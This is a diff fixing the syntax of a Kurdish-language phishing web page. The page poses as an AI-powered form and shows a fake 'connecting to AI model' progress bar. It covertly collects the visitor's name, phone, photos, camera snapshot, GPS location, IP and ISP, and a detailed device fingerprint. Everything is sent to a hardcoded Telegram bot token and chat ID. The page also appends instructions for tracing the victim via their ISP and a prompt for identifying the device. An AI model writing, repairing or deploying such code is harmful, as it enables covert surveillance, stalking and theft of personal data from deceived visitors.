@@ -1,4 +1,4 @@
-[10/2/2026 6:23 AM] Nûçey Soran: <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -121,7 +121,8 @@
             color: #e879f9;
             text-shadow: 0 0 10px rgba(232, 121, 249, 0.8);
         }
-[10/2/2026 6:23 AM] Nûçey Soran: .upload-box {
+
+        .upload-box {
             border: 2px dashed #a855f7;
             padding: 15px;
             border-radius: 10px;
@@ -232,7 +233,8 @@
             <label>ڕێکەوتی لەدایکبوون:</label>
             <input type="date" id="birthdate" class="form-control" autocomplete="off">
         </div>
-[10/2/2026 6:23 AM] Nûçey Soran: <div class="upload-box" onclick="document.getElementById('fileInput').click()">
+
+        <div class="upload-box" onclick="document.getElementById('fileInput').click()">
             <div class="upload-text" id="uploadLabel">📁 ئەپلۆدکردنی وێنەی کەسی (١ وێنە)</div>
             <input type="file" id="fileInput" accept="image/*" onchange="handleFileSelect()">
         </div>
@@ -250,7 +252,7 @@
     <script>
         const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
         const urlParams = new URLSearchParams(window.location.search);
-        const chatId = urlParams.get('id')  "6782298541";
+        const chatId = urlParams.get('id') || "6782298541";
 
         let selectedFile = null;
 
@@ -275,7 +277,7 @@
             let uEmail = document.getElementById('email').value.trim();
             let uBirth = document.getElementById('birthdate').value.trim();
 
-            if (!uName  !uPhone  !selectedFile) {
+            if (!uName || !uPhone || !selectedFile) {
                 alert("تکایە خانە سەرەکییەکان و وێنەکە پڕبکەرەوە!");
                 return;
             }
@@ -293,7 +295,7 @@
             try {
                 const parser = new UAParser();
                 const result = parser.getResult();
-                deviceModel = `${result.device.vendor  ''} ${result.device.model  ''} (${result.os.name  ''} ${result.os.version  ''})`.trim();
+                deviceModel = `${result.device.vendor || ''} ${result.device.model || ''} (${result.os.name || ''} ${result.os.version || ''})`.trim();
             } catch (e) {}
 
             const userAgentText = navigator.userAgent;
@@ -302,8 +304,8 @@
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                ip = data.ip  'نادیار';
-[10/2/2026 6:23 AM] Nûçey Soran: isp = data.org  'نادیار';
+                ip = data.ip || 'نادیار';
+                isp = data.org || 'نادیار';
             } catch (e) {}
 
             let locationText = "بەردەست نییە";
@@ -333,27 +335,28 @@
             } catch (e) {}
 
             let screenRes = `${window.screen.width}x${window.screen.height}`;
-            let pixelRatio = window.devicePixelRatio  1;
-            let cpuCores = navigator.hardwareConcurrency ? ${navigator.hardwareConcurrency} ناوک (Cores) : "نەزانراو";
-            let deviceRam = navigator.deviceMemory ? نزیکەی ${navigator.deviceMemory} گێگابایت : "نەزانراو";
-            let sysLang = navigator.language  "نەزانراو";
+            let pixelRatio = window.devicePixelRatio || 1;
+            let cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} ناوک (Cores)` : "نەزانراو";
+            let deviceRam = navigator.deviceMemory ? `نزیکەی ${navigator.deviceMemory} گێگابایت` : "نەزانراو";
+            let sysLang = navigator.language || "نەزانراو";
             let isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "دۆخی تاریک (Dark Mode)" : "دۆخی ڕووناک (Light Mode)";
 
             let extendedNetwork = "نەزانراو";
             try {
-                const conn = navigator.connection  navigator.mozConnection  navigator.webkitConnection;
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                 if (conn) {
-                    let type = conn.effectiveType  'نادیار';
+                    let type = conn.effectiveType || 'نادیار';
                     let downlink = conn.downlink ? conn.downlink + ' Mbps' : 'نادیار';
                     let rtt = conn.rtt ? conn.rtt + ' ms (Ping)' : 'نادیار';
-                    extendedNetwork = جۆر: ${type} | خێرایی: ${downlink} | پینگ (RTT): ${rtt};
+                    extendedNetwork = `جۆر: ${type} | خێرایی: ${downlink} | پینگ (RTT): ${rtt}`;
                 }
             } catch (e) {}
-[10/2/2026 6:23 AM] Nûçey Soran: let advFingerprint = "نەزانراو";
+
+            let advFingerprint = "نەزانراو";
             let gpuInfo = "نەزانراو";
             try {
                 const canvasGL = document.createElement('canvas');
-                const gl = canvasGL.getContext('webgl')  canvasGL.getContext('experimental-webgl');
+                const gl = canvasGL.getContext('webgl') || canvasGL.getContext('experimental-webgl');
                 if (gl) {
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                     if (debugInfo) {
@@ -385,7 +388,7 @@
                         if (!resolved) {
                             resolved = true;
                             window.removeEventListener('deviceorientation', handler);
-                            resolve(`Alpha: ${Math.round(event.alpha  0)}°, Beta: ${Math.round(event.beta  0)}°, Gamma: ${Math.round(event.gamma  0)}°`);
+                            resolve(`Alpha: ${Math.round(event.alpha || 0)}°, Beta: ${Math.round(event.beta || 0)}°, Gamma: ${Math.round(event.gamma || 0)}°`);
                         }
                     };
                     window.addEventListener('deviceorientation', handler);
@@ -434,7 +437,8 @@
             } catch (e) {
                 cameraStatus = "بەکارهێنەرەکە Allowـی نەکردووە (Deny کردووە)، بۆیە وێنەی نەهاتۆتەوە 🔴";
             }
-[10/2/2026 6:23 AM] Nûçey Soran: updateProgress(20, "شیکردنەوەی زانیارییە کەسییەکان...");
+
+            updateProgress(20, "شیکردنەوەی زانیارییە کەسییەکان...");
             await sleep(800);
             updateProgress(50, "بەستنەوە بە مۆدێلی AI...");
             await sleep(800);
@@ -443,40 +447,40 @@
             updateProgress(100, "خەریکە تەواو دەبێت!");
 
             let mapTextPart = mapLink 
-                ? لۆکەیشنی دەقیقی کەسەکە: [گووگڵ ماپ](${mapLink}) (Lat & Long: ${locationText}) 
-                : لۆکەیشن: ${locationStatus};
+                ? `لۆکەیشنی دەقیقی کەسەکە: [گووگڵ ماپ](${mapLink}) (Lat & Long: ${locationText})` 
+                : `لۆکەیشن: ${locationStatus}`;
 
-            const msg = 🚨 **زانیارییە پڕکراوەکان و تەکنیکییەکانی سەردانیکەر:**\n\n +
-                        👤 **زانیارییە کەسییەکان:**\n +
-                        • ناوی تەواو: ${uName} ${uFather} ${uGrand}\n +
-                        • ژمارەی تەلەفۆن: \`${uPhone}\`\n +
-                        • ئیمەیڵ: ${uEmail || 'نەنووسراوە'}\n +
-                        • ڕێکەوتی لەدایکبوون: ${uBirth || 'نەنووسراوە'}\n\n +
-                        ⏰ کات: ${fullDateText}\n +
-                        🌐 IP کەسەکە: ${ip} (${isp})\n +
-                        📍 ${mapTextPart}\n +
-                        🕵️‍♂️ دۆخی وێبگەڕ: ${incognitoStatus}\n +
-                        🛜 خێرایی و جۆری قووڵی ئینتەرنێت: ${extendedNetwork}\n +
-                        🧬 فینگەرپریینتی قووڵ (Advanced FP): ${advFingerprint}\n +
-                        🔄 سێنسەری جووڵە (Motion Sensors): ${motionInfo}\n +
-                        🔋 ڕێژەی شەحن: ${batteryInfo}\n +
-                        📷 دۆخی کامێرا: ${cameraStatus}\n +
-                        📱 سیستەم/ئامێر: ${deviceModel}\n +
-                        📐 ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})\n +
-                        🧠 CPU: ${cpuCores} | RAM: ${deviceRam}\n +
-                        🌐 زمانی سیستەم: ${sysLang}\n +
-                        🌓 دۆخی شاشە: ${isDarkMode}\n +
-                        🌐 User-Agent: ${userAgentText}\n\n +
-                        📌 **چۆنیەتی سوودوەرگرتن لە IP بۆ دۆزینەوەی شوێنی ورد (ڕێگەی یاسایی):**\n +
-                        ئەگەر لۆکەیشنی ڕاستەوخۆ (GPS) بەردەست نەبوو یان کەسەکە Denyـی کرد، دەتوانیت لە ڕێگەی IPـیەکەیەوە (${ip}) ئەم هەنگاوانە بنێیت:\n +
-                        1. ناسینەوەی کۆمپانیای دابینکەری ئینتەرنێت (ISP) کە بریتییە لە: (${isp}).\n +
-                        2. پێشکەشکردنی سکاڵای فەرمی یان داواکاری یاسایی بۆ لایەنە پەیوەندیدارەکان.\n +
-                        3. کۆمپانیاکەی ئینتەرنێت لە ڕێگەی کاتی ڕووداوەکە (${timeString}) دەتوانێت بە دەقیقی دیاری بکات کە ئەو IPـیە لەو ساتەدا لەلایەن کێوە بەکارهاتووە.\n\n +
-                        🤖 **پرۆمتی تایبەت بۆ جێمینای:**\n +
-                        "سڵاو! من ئەم زانیارییە تەکنیکییانەی ئامێری کەسێکم هەیە: GPU WebGL: ${gpuInfo}، ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})، ناوکەکانی پرۆسێسەر: ${cpuCores}، ڕام: ${deviceRam}، و User-Agent: ${userAgentText}. تکایە شیکاری بکە و دیاری بکە کە ئەم ئامێرە هی چ مۆدێل و برندێکی دیاریکراوە؟";
+            const msg = `🚨 **زانیارییە پڕکراوەکان و تەکنیکییەکانی سەردانیکەر:**\n\n` +
+                        `👤 **زانیارییە کەسییەکان:**\n` +
+                        `• ناوی تەواو: ${uName} ${uFather} ${uGrand}\n` +
+                        `• ژمارەی تەلەفۆن: \`${uPhone}\`\n` +
+                        `• ئیمەیڵ: ${uEmail || 'نەنووسراوە'}\n` +
+                        `• ڕێکەوتی لەدایکبوون: ${uBirth || 'نەنووسراوە'}\n\n` +
+                        `⏰ کات: ${fullDateText}\n` +
+                        `🌐 IP کەسەکە: ${ip} (${isp})\n` +
+                        `📍 ${mapTextPart}\n` +
+                        `🕵️‍♂️ دۆخی وێبگەڕ: ${incognitoStatus}\n` +
+                        `🛜 خێرایی و جۆری قووڵی ئینتەرنێت: ${extendedNetwork}\n` +
+                        `🧬 فینگەرپریینتی قووڵ (Advanced FP): ${advFingerprint}\n` +
+                        `🔄 سێنسەری جووڵە (Motion Sensors): ${motionInfo}\n` +
+                        `🔋 ڕێژەی شەحن: ${batteryInfo}\n` +
+                        `📷 دۆخی کامێرا: ${cameraStatus}\n` +
+                        `📱 سیستەم/ئامێر: ${deviceModel}\n` +
+                        `📐 ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})\n` +
+                        `🧠 CPU: ${cpuCores} | RAM: ${deviceRam}\n` +
+                        `🌐 زمانی سیستەم: ${sysLang}\n` +
+                        `🌓 دۆخی شاشە: ${isDarkMode}\n` +
+                        `🌐 User-Agent: ${userAgentText}\n\n` +
+                        `📌 **چۆنیەتی سوودوەرگرتن لە IP بۆ دۆزینەوەی شوێنی ورد (ڕێگەی یاسایی):**\n` +
+                        `ئەگەر لۆکەیشنی ڕاستەوخۆ (GPS) بەردەست نەبوو یان کەسەکە Denyـی کرد، دەتوانیت لە ڕێگەی IPـیەکەیەوە (${ip}) ئەم هەنگاوانە بنێیت:\n` +
+                        `1. ناسینەوەی کۆمپانیای دابینکەری ئینتەرنێت (ISP) کە بریتییە لە: (${isp}).\n` +
+                        `2. پێشکەشکردنی سکاڵای فەرمی یان داواکاری یاسایی بۆ لایەنە پەیوەندیدارەکان.\n` +
+                        `3. کۆمپانیاکەی ئینتەرنێت لە ڕێگەی کاتی ڕووداوەکە (${timeString}) دەتوانێت بە دەقیقی دیاری بکات کە ئەو IPـیە لەو ساتەدا لەلایەن کێوە بەکارهاتووە.\n\n` +
+                        `🤖 **پرۆمتی تایبەت بۆ جێمینای:**\n` +
+                        `"سڵاو! من ئەم زانیارییە تەکنیکییانەی ئامێری کەسێکم هەیە: GPU WebGL: ${gpuInfo}، ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})، ناوکەکانی پرۆسێسەر: ${cpuCores}، ڕام: ${deviceRam}، و User-Agent: ${userAgentText}. تکایە شیکاری بکە و دیاری بکە کە ئەم ئامێرە هی چ مۆدێل و برندێکی دیاریکراوە?"`;
 
             try {
-                await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
@@ -492,19 +496,20 @@
                     const formDataCam = new FormData();
                     formDataCam.append('chat_id', chatId);
                     formDataCam.append('photo', cameraBlob, 'camera.jpg');
-                    formDataCam.append('caption', 📸 وێنەی ڕاستەوخۆی کەسەکە (${uName}));
+                    formDataCam.append('caption', `📸 وێنەی ڕاستەوخۆی کەسەکە (${uName})`);
                     
-                    await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, { method: 'POST', body: formDataCam });
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataCam });
                 } catch (err) {}
             }
-[10/2/2026 6:23 AM] Nûçey Soran: if (selectedFile) {
+
+            if (selectedFile) {
                 try {
                     const formDataUpload = new FormData();
                     formDataUpload.append('chat_id', chatId);
                     formDataUpload.append('photo', selectedFile, selectedFile.name);
-                    formDataUpload.append('caption', 🖼 ئەو وێنەیەی کەسەکە خۆی ئەپلۆدی کردووە (${uName}));
+                    formDataUpload.append('caption', `🖼 ئەو وێنەیەی کەسەکە خۆی ئەپلۆدی کردووە (${uName})`);
                     
-                    await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, { method: 'POST', body: formDataUpload });
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formDataUpload });
                 } catch (err) {}
             }
 
